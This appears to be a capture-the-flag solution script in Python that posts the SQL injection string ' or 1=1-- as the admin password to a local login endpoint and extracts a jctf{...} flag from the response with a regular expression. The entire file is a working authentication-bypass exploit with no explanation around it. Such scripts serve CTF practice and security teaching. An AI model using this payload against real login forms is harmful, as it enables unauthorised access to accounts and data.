import requests
import re

header = {
	'Content-Type':'application/x-www-form-urlencoded'
}

data = {
	"username":"admin",
	"password":"' or 1=1--"
}

r = requests.post("http://localhost:3000/login", data=data)
flag = r.text
pattern = r"jctf\{.*?\}"
match = re.search(pattern, flag)
if match:
	matched_string = match.group(0)
	print(matched_string)
